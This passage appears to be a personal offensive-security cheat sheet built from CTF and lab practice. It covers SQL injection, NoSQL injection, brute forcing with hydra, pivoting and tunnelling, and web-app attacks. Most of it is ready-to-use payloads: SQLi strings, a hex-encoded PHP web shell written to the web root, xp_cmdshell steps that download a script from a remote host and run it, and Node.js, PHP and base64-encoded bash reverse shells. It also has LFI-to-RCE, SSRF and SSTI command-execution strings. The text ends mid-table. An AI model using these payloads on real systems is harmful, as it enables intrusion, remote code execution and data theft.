<strong><em>sqli_one = db</em></strong></p><p><code>0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'</code><br><strong><em>staff_users = table</em></strong></p><ul><li>single column concat <code>' UNION SELECT username || '~' || password FROM users--</code></li></ul><p><code>1 UNION SELECT null,null,null,flag from exercise.secrets</code> where flag is column, exercise is db, secrets is table > null,null,null,null cause 4 columns</p><h3 id=sorting>Sorting<a hidden class=anchor aria-hidden=true href=#sorting>#</a></h3><ul><li>can the app sort stuff? inject!</li><li>delete value of param, inject stuff</li></ul><h3 id=boundary-testing>Boundary Testing<a hidden class=anchor aria-hidden=true href=#boundary-testing>#</a></h3><ul><li>same as sorting <code>order by 5</code></li></ul><h3 id=error-based-payloads>Error Based Payloads<a hidden class=anchor aria-hidden=true href=#error-based-payloads>#</a></h3><p><a href=https://sqlwiki.netspi.com/injectionTypes/errorBased/#oracle>sqlwiki netspi</a></p><ul><li>MSSQL <code>cast(@@version as integer)</code><ul><li><code>1+AND+8671+IN+(SELECT+(CHAR(0)%2b(SELECT+(CASE+WHEN+(8671%3d8671)+THEN+(SELECT+STRING_AGG(flag,+',')+from+exercise.information_schema.columns+where+TABLE_NAME+=+'secrets')</code></li></ul></li><li>Postgresql <code>cast(version() as integer)</code></li><li>MYSQL <code>extractvalue('',concat('>',version()))</code></li><li>Oracle <code>to_char(dbms_xmlgen.getxml('select "'|| (select substr(banner,0,30) from v$version where rownum=1)||'" from sys.dual'))</code></li></ul><h3 id=stacked-queries>Stacked Queries<a hidden class=anchor aria-hidden=true href=#stacked-queries>#</a></h3><ul><li><code>asc;select+flag+from+flags;</code> adding another query after the param value <code>asc</code></li><li><code>1;WAITFOR DELAY '0:0:5'--</code></li><li>for postgresql <code>;SELECT+PG_SLEEP(5)--</code></li></ul><h3 id=boolean>Boolean<a hidden class=anchor aria-hidden=true href=#boolean>#</a></h3><ul><li><code>(SELECT (CASE WHEN (4255=4255) THEN 1 ELSE (SELECT 9369 UNION SELECT 1823) END))</code></li></ul><h3 id=reading-and-writing-files>Reading and Writing Files<a hidden class=anchor aria-hidden=true href=#reading-and-writing-files>#</a></h3><ul><li>Postgresql<ul><li>To read a file and then save to a table <code>create table tmp(data text); copy tmp from '/etc/passwd'; select * from tmp;</code></li><li>Alternative is <code>select pg_read_file('/etc/passwd')</code></li></ul></li><li>MYSQL<ul><li>Check if mysql is configured to read all files <code>SELECT @@GLOBAL.secure_file_priv;</code> this will return what folder we have access to. If output is null meaning it is disabled and we can read anything.</li><li>To write a file use <code>into outfile</code> <code>SELECT * FROM users INTO OUTFILE '/var/lib/mysql-files/test.txt'</code> The file location must be writable to the OS user the database software is running as. The <code>/var/lib/mysql-files</code> is the output of <code>SELECT @@GLOBAL.secure_file_priv</code> <strong><em>I have a note of <code>into outfile</code> in ReadME.md</em></strong></li><li>To read the file use <code>load_file()</code> <code>SELECT LOAD_FILE('/var/lib/mysql-files/test.txt')</code></li></ul></li></ul><h3 id=blind-sqli--manual-bruteforce>Blind SQLi / Manual Bruteforce<a hidden class=anchor aria-hidden=true href=#blind-sqli--manual-bruteforce>#</a></h3><p><code>select substring(user() , 1, 1) = 'r';</code></p><p><code>' or substr (user(), 1, 1)= 'a</code></p><p><code>admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';</code></p><p><code>admin123' UNION SELECT 1,2,3 where database() like 's%';--</code></p><p><code>admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--</code></p><p><code>admin123' UNION SELECT 1,2,3 from users where username like 'a%</code></p><h4 id=blind-sql-in-a-cookie>Blind SQL in a cookie<a hidden class=anchor aria-hidden=true href=#blind-sql-in-a-cookie>#</a></h4><p><code>TrackingId=xyz'||(SELECT '' FROM dual)||'</code> <strong><em>test on cookie header TrackingId is a cookie</em></strong></p><p><code>'||(SELECT Case When (1=1) then to_char(1/0) else '' end FROM dual)||'</code></p><p><code>'||(SELECT Case When (1=1) then to_char(1/0) else '' end FROM users where username='administrator') ||'</code></p><p><code>'||(SELECT Case When (1=1) then to_char(1/0) else '' end FROM users where username='administrator' and lenght(password)>1) ||'</code></p><p><code>'||(SELECT Case When (1=1) then to_char(1/0) else '' end FROM users where username='administrator' and substr(password,1,1)='a') ||'</code></p><p><strong><em>Limit output of rows = rownum=1 &mdash;same as Limit 1 for mysql</em></strong>
<strong><em>This is syntax is for oracle - Dual is a default table</em></strong></p><ul><li>updating entry <code>UPDATE wp_users SET user_pass="5f4dcc3b5aa765d61d8327deb882cf99" where id=1</code></li></ul><p>What to do when there is a confirmed injection point?</p><ul><li>Determine how many columns using:</li></ul><p><code>' UNION SELECT null;-- -</code> <strong><em>or by using ORDER BY #&ndash; -</em></strong></p><p><code>' UNION SELECT 'asd', 'asd';-- -</code> <strong><em>asd should appear somewhere</em></strong></p><p><strong><em>NOTE Check if it accepts string or integer</em></strong></p><ul><li>After enumerating the number of columns continue with Union injections</li></ul><h3 id=querying-version-db-table_name-user>Querying Version, db, Table_name, user()<a hidden class=anchor aria-hidden=true href=#querying-version-db-table_name-user>#</a></h3><p><code>1 union select 1, @@version, 3, 4</code></p><p><code>1 union select 1, database(), 3, 4</code></p><p><code>1 union select 1, table_name, 3, 4 fomr information_schema.tables</code></p><p><code>1 union select 1, column_name, 3, 4 fomr information_schema.columns</code></p><p><code>' UNION SELECT user(), 'asd';-- -</code></p><p>One column available get username and password <strong><em>or group_concat maybe?</em></strong></p><p><code>'+UNION+SELECT+NULL,username||'~'||password+FROM+users--</code></p><h3 id=uploading-shell-sqli>Uploading Shell SQLi<a hidden class=anchor aria-hidden=true href=#uploading-shell-sqli>#</a></h3><ul><li><code>&lt;value>' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E-- -</code><ul><li><code>INTO OUTFILE '/var/www/html/shell.php</code> <strong><em>output file to shell.php /var/www/html most common default location</em></strong></li><li><code>0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E</code> Hex of <code>&lt;?php echo "&lt;pre>" . shell_exec($_GET["cmd"]) . "&lt;/pre>";?></code> <strong><em>or hex of the actual php reverse shell from pentest monkey</em></strong></li></ul></li></ul><h3 id=sqli-rce>sqli RCE<a hidden class=anchor aria-hidden=true href=#sqli-rce>#</a></h3><ul><li>MSsql<ul><li><code>xp_cmdshell</code> takes a string and passes it to a cmd shell for execution <strong><em>Disabled by default</em></strong></li><li>If DB user has appropriate permissions we can enable xp_cmdshell using</li></ul></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>EXECUTE sp_configure <span class=s1>&#39;show advanced options&#39;</span>, 1<span class=p>;</span>  
</span></span><span class=line><span class=cl>GO
</span></span><span class=line><span class=cl>RECONFIGURE<span class=p>;</span>  
</span></span><span class=line><span class=cl>GO 
</span></span><span class=line><span class=cl>EXECUTE sp_configure <span class=s1>&#39;xp_cmdshell&#39;</span>, 1<span class=p>;</span>  
</span></span><span class=line><span class=cl>GO 
</span></span><span class=line><span class=cl>RECONFIGURE<span class=p>;</span>  
</span></span><span class=line><span class=cl>GO
</span></span></code></pre></div><ul><li>MSSQL<ul><li><code>xp_cmdshell</code></li><li>If <code>xp_cmdshell</code> is enabled call it using <code>EXECUTE xp_cmdshell 'command to run here';</code> <strong><em>Linux does not support several functions</em></strong></li><li>If DB user has appropriate permissions we can enable xp_cmdshell using the ff:<ul><li><code>EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE;</code> <strong><em>enables xp_cmdshell</em></strong></li><li>then <code>EXEC xp_cmdshell 'curl http://192.168.48.2:8000/a.sh';</code></li><li><code>EXEC xp_cmdshell 'bash a.sh';</code></li></ul></li></ul></li></ul><p>In order of usage</p><ul><li><code>EXECUTE sp_configure 'show advanced options',1; RECONFIGURE;</code></li><li><code>EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE;</code></li><li><code>EXEC xp_cmdshell 'curl http://192.168.48.2:8000/itworked';</code> confirm RCE using this</li><li><code>EXEC+xp_cmdshell+'curl+http://192.168.48.2:8000/RevShell.java+--output+%temp%/RevShell.java';</code> for windows</li><li><code>EXEC xp_cmdshell 'java %temp%/RevShell.java';</code> for windows dont forget to url encode the <code>%</code></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>- To allow advance options to be changed.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>EXECUTE sp_configure <span class=s1>&#39;show advanced options&#39;</span>, 1<span class=p>;</span>  
</span></span><span class=line><span class=cl>GO
</span></span><span class=line><span class=cl>- To update the currently configured value <span class=k>for</span> advance options.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>RECONFIGURE<span class=p>;</span>  
</span></span><span class=line><span class=cl>GO 
</span></span><span class=line><span class=cl>- To <span class=nb>enable</span> xp_cmdshell
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>EXECUTE sp_configure <span class=s1>&#39;xp_cmdshell&#39;</span>, 1<span class=p>;</span>  
</span></span><span class=line><span class=cl>GO 
</span></span><span class=line><span class=cl>- To update currently config value <span class=k>for</span> xp_cmdshell
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>RECONFIGURE<span class=p>;</span>  
</span></span><span class=line><span class=cl>GO
</span></span></code></pre></div><ul><li>example <code>index.php?id=7%20UNION%20SELECT%20*%20from%20flags%20INTO%20OUTFILE%20%27/var/www/html/shell.php%27%20LINES%20TERMINATED%20BY%200x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E;--%20-</code></li></ul><h3 id=sqlmap>SQLMap<a hidden class=anchor aria-hidden=true href=#sqlmap>#</a></h3><p><a href=https://www.comparitech.com/net-admin/sqlmap-cheat-sheet/>cheatsheet</a></p><ul><li><p><code>sqlmap -u &lt;URL> -p &lt;injection parameter> [options]</code></p></li><li><p><code>sqlmap -u "http://test.site/view.php?id=1" -p id --technique=U</code> <strong><em>technique used is Union</em></strong></p></li><li><p><code>sqlmap -u "http://test.site/view.php?id=1" --tables</code></p></li><li><p><code>sqlmap -u "http://test.site/view.php?id=1" --current-db &lt;dbname> -columns</code></p></li><li><p><code>sqlmap -u "http://test.site/view.php?id=1" --current-db &lt;dbname> --dump</code></p></li><li><p><code>sqlmap -u "http://test.site/view.php?id=1" -D &lt;dbname> -T &lt;tablename> -C &lt;Column> --dump1</code></p></li><li><p><code>sqlmap -u http://target/whatever --method POST --data "db=mysql&name=asd&sort=id&order=asc" -p "name,sort,order"</code></p><ul><li><code>-p</code> parameters to test with from <code>--data</code></li><li><code>--data</code> post body</li></ul></li><li><p><code>sqlmap -u http://attack/whatever --method POST --data "db=mysql&name=asd&sort=id&order=asc" -p "name,sort,order" --dbms=mysql --dump</code></p><ul><li><code>--dbms</code> specify what dbms in use</li><li><code>--dump</code> dump all contents of all tables in the db</li></ul></li></ul><p>For Post Params/data</p><p><code>sqlmap -u &lt;URL> --data=&lt;POST STRING> -p &lt;PARAMETER> [options]</code></p><p>Sometimes you don&rsquo;t need the <strong>&rsquo;</strong></p><p><code>id=1 OR 1=1</code></p><h2 id=nosqli>NoSQLi<a hidden class=anchor aria-hidden=true href=#nosqli>#</a></h2><h3 id=mongodb>MongoDB<a hidden class=anchor aria-hidden=true href=#mongodb>#</a></h3><p><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection>PayloadAlltheThings</a></p><ul><li>default port is 2701</li><li>mongo to start - show databases, use whatever</li><li><code>db.createCollection("users")</code> , <code>db.users.insert({id:"1", username: "admin", email: "admin@test.test", password: "password"})</code> , <code>db.users.find()</code> , <code>db.users.update({id:"2"}, {$set: {username: "test"}});</code></li><li><code>.bson</code> supports json</li><li><code>username[$eq]=admin&password[$ne]=asd</code></li><li>collections = tables, documents = rows, fields = columns</li><li>$and = AND, $or = OR<ul><li>$eq = matches records that equal to a certain value</li><li>$ne = matches records that are not equal to a certain value</li><li>$gt = matches records that are greater than a certain value.</li><li>$where = matches records based on Javascript condition</li><li>$exists = matches records that have a certain field</li><li>$regex = matches records that satisfy certain regular expressions.</li><li><code>mongo mongodb://admin:pass@192.168.120.186:27017/</code></li></ul></li></ul><h2 id=bruteforcing>Bruteforcing<a hidden class=anchor aria-hidden=true href=#bruteforcing>#</a></h2><h3 id=basic-auth>Basic Auth<a hidden class=anchor aria-hidden=true href=#basic-auth>#</a></h3><p><code>hydra -L user.txt -P rockyou.txt &lt;machine-ip> http-head /</code></p><p><code>hydra -L user.txt -P rockyou.txt &lt;machine-ip> http-get /</code></p><h3 id=smb>SMB<a hidden class=anchor aria-hidden=true href=#smb>#</a></h3><p><code>hydra -L user.txt -P rockyou.txt -m &lt;domain> &lt;ip> smb</code> <strong><em>or metasploit</em></strong></p><h3 id=ftp>FTP<a hidden class=anchor aria-hidden=true href=#ftp>#</a></h3><p><code>hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.120.161 ftp</code></p><h2 id=tcpdump>TCPdump<a hidden class=anchor aria-hidden=true href=#tcpdump>#</a></h2><h3 id=monitor-your-injections-with-tcpdump>Monitor your injections with tcpdump<a hidden class=anchor aria-hidden=true href=#monitor-your-injections-with-tcpdump>#</a></h3><p>Ping yourself and run <code>tcpdump -i &lt;interface> icmp</code></p><h2 id=pivotingportforwadingtunneling>Pivoting/PortForwading/Tunneling<a hidden class=anchor aria-hidden=true href=#pivotingportforwadingtunneling>#</a></h2><h3 id=used-msfconsole-mutihandler>Used msfconsole muti/handler<a hidden class=anchor aria-hidden=true href=#used-msfconsole-mutihandler>#</a></h3><p><a href=https://therennox.github.io/thm/yearOfTheFox>Therennox YOTF writeup</a></p><h3 id=socat>Socat<a hidden class=anchor aria-hidden=true href=#socat>#</a></h3><p>Opening 8888 in the victim to connect to victim 22 <strong><em>in this scenario only localhosts is allowed to victim 22</em></strong><br><code>/tmp/socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22</code><br>read more here <a href=https://tryhackme.com/resources/blog/year-of-the-fox-official-write-up>Muirlandoracle YOTF writeup</a> or <a href=https://h0j3n.medium.com/tryhackme-year-of-the-fox-631c7752fab2>H0j3n&rsquo;s</a></p><h4 id=reverse-shell-relay>Reverse Shell Relay<a hidden class=anchor aria-hidden=true href=#reverse-shell-relay>#</a></h4><p><code>./socat tcp-l:8000 tcp:ATTACKING_IP:443 &</code></p><ul><li>tcp-l:8000 = used to create the first half of the connection &ndash; ipv4 listener on tcp port 8000 of the victim</li><li>tcp:attacking_ip:443 = connects back to our local IP on port 443</li><li>& = backgrounds the listener</li></ul><p>This will connect back to our machine so we need to setup a netcat listener</p><p><code>./nc-hyst 127.0.0.1 8000 -e /bin/bash</code></p><h4 id=port-forwarding-using-socat>Port Forwarding using Socat<a hidden class=anchor aria-hidden=true href=#port-forwarding-using-socat>#</a></h4><p><code>./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &</code></p><ul><li>Watch <a href="https://www.youtube.com/watch?v=Auqt-NSB4SQ">IPPSEC</a></li></ul><h3 id=proxychains>ProxyChains<a hidden class=anchor aria-hidden=true href=#proxychains>#</a></h3><ul><li><p>proxy a netcat <code>proxychains nc 172.16.0.10 23</code></p></li><li><p>when using nmap w/ proxychains comment out proxy_dns inside the proxychains.conf file</p></li><li><p>only tcp scan will work</p></li><li><p>udp, syn and ping scan wont work - use -Pn</p></li></ul><h3 id=port-forwarding>Port Forwarding<a hidden class=anchor aria-hidden=true href=#port-forwarding>#</a></h3><p>Local: From attacker to victim via SSH</p><p><strong><em>Attacker &ndash;ssh&ndash;> 172.16.0.5 &ndash;http&ndash;> 172.16.0.10</em></strong></p><ul><li><code>ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN</code> / ssh -i key -L 9000:10.10.10.75:80 10.10.10.73<ul><li>f = backgrounds shell immediately</li><li>N = tells SSH that it doesn;t need to execute any command and just set up the connection</li></ul></li></ul><p>Now we can access the webserver on 172.16.0.10 using our own box localhost:8000
<strong><em>Use this when victim-localhost has open port that is only accessible by victim-localhost itself</em></strong></p><h3 id=reverse-connection>Reverse Connection<a hidden class=anchor aria-hidden=true href=#reverse-connection>#</a></h3><p>When doing this to avoid reverse shell and to only allow port forwarding add <code>command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty</code> at the beginning of the public key.</p><p><strong><em>We have a shell on victim(05) and we want to use it as a reverse connection from our machine(20) to webserver_victim(10)</em></strong></p><ul><li><code>ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN</code></li></ul><h3 id=plinkexe-for-windows>Plink.exe for Windows<a hidden class=anchor aria-hidden=true href=#plinkexe-for-windows>#</a></h3><p>Command Line version of PuTTY SSH Client</p><p><strong><em>Reverse Connection from Victim to our Attacker Machine.</em></strong>
<strong><em>.20 Attacker &mdash; .05 Victim we have a shell from &mdash; .10 Webserver</em></strong></p><ul><li><code>cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N</code></li></ul><p>For the keyfile we need to convert it using puttygen tool</p><ul><li><code>puttygen KEYFILE -o OUTPUT_KEY.ppk</code></li></ul><h3 id=reverse-ssh-tunnel>Reverse SSH Tunnel<a hidden class=anchor aria-hidden=true href=#reverse-ssh-tunnel>#</a></h3><p>Use when port is only accessible by victim local</p><p><code>ssh -L 4444:10.10.125.232:8080</code></p><ul><li>4444 port of victim you will access from outside</li><li>10.10.125.232 victim&rsquo;s ip</li><li>8080 local port you want to access inside the victim</li></ul><h2 id=web-app>Web APP!<a hidden class=anchor aria-hidden=true href=#web-app>#</a></h2><h3 id=authentication>Authentication<a hidden class=anchor aria-hidden=true href=#authentication>#</a></h3><ul><li>Check created cookie is it a hashed value of user? change</li><li>admin exist? try registering Admin</li><li>add space before and after admin</li><li>redirects to <code>/login.php</code> from <code>/</code> try intercepting response and change 302 Not Found to 200 OK</li><li>Blacklisted? is <code>X-Forwarded-For header</code> allowed?</li><li>Check timing might be different for username enumeration, make password extra long then check response time</li><li>Blacklisted after a few tries? try alternating correct creds with bruteforced creds</li><li>Valid users gets locked out <strong><em>Can be used to enum valid users</em></strong></li><li>PHP juggling bug send password as an array <code>username=admin&password[]=</code><ul><li>Code looks like this <code>if(strcmp($_REQUEST['password'], $password) == 0)</code> in the backend PHP compares input from a hardcoded string or db.</li></ul></li></ul><h4 id=2fa>2FA<a hidden class=anchor aria-hidden=true href=#2fa>#</a></h4><ul><li>Manually access /account-page when asked for 2fa? might be able to bypass</li></ul><h4 id=password-reset-bypasses>Password Reset bypasses<a hidden class=anchor aria-hidden=true href=#password-reset-bypasses>#</a></h4><ul><li>Use X-Forwarded-Host header. <code>X-Forwarded-Host: your-exploit-server-id.web-security-academy.net</code> <strong><em>REMOVE HTTPS</em></strong><ul><li>log should show unique token for the victim</li></ul></li></ul><h4 id=saml>SAML<a hidden class=anchor aria-hidden=true href=#saml>#</a></h4><ul><li>b64decode SAMLResponse - Important Part is <strong><em>&lt;NameID&mldr;></em></strong><ul><li>Start SAML interaction > Intercept SAMLResponse > Tamper SAMLResponse > Forward Malicious SAMLResponse to SP</li><li>Base64 Decode SAMLResponse > Change <strong><em>&lt;NameID..youremail></em></strong> to <strong><em>&lt;NameID..adminemail></em></strong></li></ul></li></ul><h4 id=outh2>Outh2<a hidden class=anchor aria-hidden=true href=#outh2>#</a></h4><ul><li>CSRF vulnerabilities</li></ul><h3 id=authorization>Authorization<a hidden class=anchor aria-hidden=true href=#authorization>#</a></h3><ul><li>IDOR<ul><li>Can&rsquo;t IDOR directly? try in Edit, Delete, Modify etc.</li><li>add .json extension?</li></ul></li><li>Object with multiple attributes when signing up<ul><li><code>user[username]=evo&user[password]=evo&submit=Submit</code> <strong><em>maybe add user[admin]=true or 1? admin can also be exchanged to other stuff like organisation_id etc whatever is in use to bypass Authorization</em></strong></li></ul></li></ul><h3 id=code-injection>Code Injection<a hidden class=anchor aria-hidden=true href=#code-injection>#</a></h3><ul><li>Test with <code>'</code> <code>"</code> in every params just like sql. Some might give an error. <strong><em>we want it to error out then add a concat character(depends on what is used by website) example <code>"+"</code> for ruby. Or <code>""</code> maybe. NOTE:REMEMBER TO URL ENCODE <code>+</code> <code>%2b</code></em></strong><ul><li>Errors out with <code>"</code>? try <code>example.com/?test=evo".system("id")."</code> <strong><em><code>.</code> is used to concat in PHP</em></strong></li><li>when website is sorting via PHP try to input <code>'</code> or <code>"</code> again</li><li>PHP version below 5 - Notice /pattern/? inject to /pattern/e then insert command phpinfo() to verify</li><li>&lsquo;.phpinfo().&rsquo; - replace phpinfo() with system(&ldquo;id&rdquo;) or what ever command<ul><li>Ruby<ul><li><code>+</code> for concat</li><li>command inside `</li></ul></li><li>Perl<ul><li><code>.</code> for concat</li><li>command inside `</li></ul></li><li>Python <a href=https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html>Sethsec</a><ul><li><code>+</code> for concat</li><li><code>str(os.popen("ls").read())</code></li><li><code>str(__import__('os').system('id'))</code></li><li><code>str(__import__('os').popen('id').read())</code></li><li><code>str(__import__('os').popen(__import__('base64').base64decode('&lt;command in base64>')).read())</code></li></ul></li></ul></li></ul></li><li>Check browser network if it&rsquo;s loading any injectable params</li></ul><h3 id=command-injection>Command Injection<a hidden class=anchor aria-hidden=true href=#command-injection>#</a></h3><ul><li><p>Try all characters for chaining commands <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#chaining-commands>PayloadAlltheThings</a></p></li><li><p>Straight out try <em>backtick</em> <code>reverse shell or ping</code> <em>backtick</em> or <code>$(&lt;command>)</code> <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#inside-a-command>PayloadAlltheThings</a></p></li><li><p>try adding <code>;</code> <code>&</code> <code>|</code> <code>||</code> at the end of the command aswell. EX: <code>email=all3n@evo.test|sleep+5|</code></p></li><li><p>there&rsquo;s a script in etc</p></li><li><p>blind and can&rsquo;t get a shell? maybe there&rsquo;s a writable directory /images? whoami>/var/www/images</p></li><li><p>we can use the semicolon (;), the logical AND (&&), the logical OR (||), and even a single pipe character (|)</p></li><li><p>In addition to the semicolon, which allows us to chain multiple commands together in one statement, another unique separator for Linux is the newline (\n)</p></li><li><p>URL encode. USE BURP.</p></li><li><p>Use null statement <code>$()</code></p><ul><li>This technique also works for more complex payloads like <code>nc -nlvp 9090</code>, which becomes: <code>n$()c -n$()lvp 9090</code></li></ul></li><li><p>Convert to base64 then decode</p><ul><li><code>echo+'Y2F0IC9ldGMvcGFzc3dkCg==+'|+base64+-d</code></li><li>if no base64 use openssl</li></ul></li><li><p>Check for the following:</p><p>Linux</p><p><img loading=lazy src=/notes/nixinject.png alt></p><p>Windows</p><p><img loading=lazy src=/notes/wininject.png alt></p></li><li><p>Node.js reverse shell <code>echo "require('child_process').exec('nc -nv 192.168.49.51 9090 -e /bin/bash')" > /var/tmp/offsec.js ; node /var/tmp/offsec.js</code> //tried with payloads in payload all the things but does not work needs the <code>> /var....</code> part at the end</p></li></ul><h4 id=php>PHP<a hidden class=anchor aria-hidden=true href=#php>#</a></h4><ul><li><code>php -r '$sock=fsockopen("192.168.49.51",9090);exec("/bin/sh -i &lt;&3 >&3 2>&3");'</code><ul><li><code>php -r</code> instructs php to run the command in quotes <code>$sock=fsockopen("192.168.49.51",9090);exec("/bin/sh -i &lt;&3 >&3 2>&3");</code></li><li><code>$sock=fsockopen("192.168.49.51",9090)</code> establish a tcp socket to our attacker machine</li><li><code>;exec("/bin/sh -i &lt;&3 >&3 2>&3");</code> will call the function exec</li></ul></li><li>if <code>phpninfo()</code> is available check for <code>disable_functions</code> and <code>Document_root</code></li></ul><h4 id=this-worked-for-the-year-of-the-fox-challenge>This worked for the year of the fox challenge<a hidden class=anchor aria-hidden=true href=#this-worked-for-the-year-of-the-fox-challenge>#</a></h4><p>Client side filtering for symbols - used burp to bypass filtering</p><p><code>"target":"\" ; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC40LjE0LjUxLzcwMDMgMD4mMQ== | base64 -d | bash; echo\""</code> <strong><em>this is a post request inside a search function</em></strong>
<code>\</code> escapes the <code>"</code> character</p><h3 id=directory-traversal>Directory Traversal<a hidden class=anchor aria-hidden=true href=#directory-traversal>#</a></h3><ul><li><code>../../../../../../../etc/passwd</code></li><li>try reading the php file with the parameter ex: <code>file.php?file=/var/www/file.php</code></li><li>If it loads blank maybe it requires you to start with specific directory. ex: this one requires to start with <code>/var/www</code> <code>file.php?file=/var/www/../../../../../etc/passwd</code></li><li>add %00 at the end <code>../../../../../etc/passwd%00</code> <strong><em>fixed in php version 5.3.4</em></strong></li><li>try <code>/etc/passwd</code> without the <code>../../../../</code></li><li><code>....//....//....//....//....//etc/passwd</code></li><li>url encode = %2E%2E%2F</li><li>double url encode = %252E%252E%252F</li></ul><h3 id=file-inclusion>File Inclusion<a hidden class=anchor aria-hidden=true href=#file-inclusion>#</a></h3><ul><li>Loads php files - look for something like <code>?page=index.php</code> try injecting a <code>'</code> or <code>"</code> if it errors out</li><li>Normal Directory traversal will work</li><li>Try injecting remote sites like <code>http://www.google.com</code> or your own controlled site <code>/?page=http://evohaxthepla.net/test.txt&cmd=id</code> <strong><em>test.txt contains a php one liner</em></strong></li><li>look for the following in the source code:<ul><li><code>include</code></li><li><code>require</code></li><li><code>include_once</code></li><li><code>require_once</code></li></ul></li><li><code>php://filter/resource=/etc/passwd</code></li><li><code>php://filter/convert.base64-encode/resource=/etc/passwd</code></li><li>LFI to RCE via Log files<ul><li>include a malicious payload into services log files such as Apache, SSH, etc. then request log file via LFI<ul><li>Example, a user can include a malicious payload into an apache log file via User-Agent or other HTTP headers. In SSH, the user can inject a malicious payload in the username section.</li><li><code>echo '&lt;?php echo 'whatever ';system($_GET['cmd']);?>'</code> > whatever.php</li></ul></li></ul></li></ul><h3 id=ldap>LDAP<a hidden class=anchor aria-hidden=true href=#ldap>#</a></h3><ul><li>Test with <code>)</code> if you&rsquo;ll get an error <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection>PayloadAllthethings</a></li><li>In a post request when signing in remove the whole post body ex: <code>username=asd&password=asd</code> delete this whole data.</li><li><code>adm*))%00</code></li><li><code>admin)(cn=*))%00&password=admin</code></li></ul><h3 id=open-redirect>Open Redirect<a hidden class=anchor aria-hidden=true href=#open-redirect>#</a></h3><p><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect>PayloadAllthethings</a></p><ul><li>webhook.site <strong><em>can be used to test?</em></strong></li><li>http and https is filtered can be bypassed by just doing <code>//google.com</code> <strong><em>check payloadallthethings for more</em></strong></li></ul><h3 id=csrf>CSRF<a hidden class=anchor aria-hidden=true href=#csrf>#</a></h3><p>What to look for?</p><ul><li>no csrf token, no samesite attribute on the cookie</li><li>Remove CSRF token</li><li>SameSite=Lax prevents CSRF</li><li>Change POST to GET</li><li>CSRF token is not user specific<ul><li>Intercept CSRF thru proxy then drop it - use the intercepted CSRF token on the other account check if it works</li></ul></li><li></li></ul><h3 id=ssrf>SSRF<a hidden class=anchor aria-hidden=true href=#ssrf>#</a></h3><p><a href="https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf#page=9&zoom=100,96,210">Owasp</a></p><ul><li>Basically look for areas where the victim sends a request or downloads from another location ex: <code>assets.test.com</code>. And then try accessing localhost or other payloads. <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery>PayloadAllthethings</a></li><li>Gopher <code>gopher%3a//localhost%3a80/XPOST%2520/api/admin/create%2520HTTP/1.1%250aContent-Length%3a%252029%250aContent-Type%3a%2520application/x-www-form-urlencoded%250a%250ausername%3dhyst2%26password%3dhyst2</code> manually add <code>%20</code> for spaces and <code>%0a</code> for new lines then urlencode the wholething</li><li>try <code>file:///</code> and all other methods</li><li>aws <code>169.254.169.254</code></li><li>google cloud <code>metadata.google.internal</code></li><li><code>file:///c:/windows/win.ini</code> <code>file:///etc/passwd</code></li><li><code>curl gopher://127.0.0.1:9000/_GET%20/hello_gopher%20HTTP/1.1</code></li></ul><h3 id=ssti>SSTI<a hidden class=anchor aria-hidden=true href=#ssti>#</a></h3><ul><li>Nice labs from <a href=https://portswigger.net/web-security/all-labs>PortSwigger</a></li><li>Look for injectable parameters and then fuzz - <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz>PayloadAllthethings</a> has a good wordlists.</li><li>Check template statements like ex: dropdown where you can choose if you want to display firstname, Lastname etc. try to break out of the template statement <code>firstname}}{{7*7</code> <a href=https://portswigger.net/research/server-side-template-injection>Port Swigger</a></li><li>Tornado lab in portswigger this worked <code>{{2*2}}{%+import+os+%25}{{os.system('whoami')}}</code> <a href=https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection>hacktricks</a></li><li>ex: <code>{% import os %}{{ os.popen("whoami").read() }}</code></li><li>After finding a vulnerable parameter and determining what template engine is used. go to <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection>PayloadAlltheThings</a> to check for code executions.</li></ul><table><thead><tr><th>Templating Engine</th><th>Language</th><th>Server/client 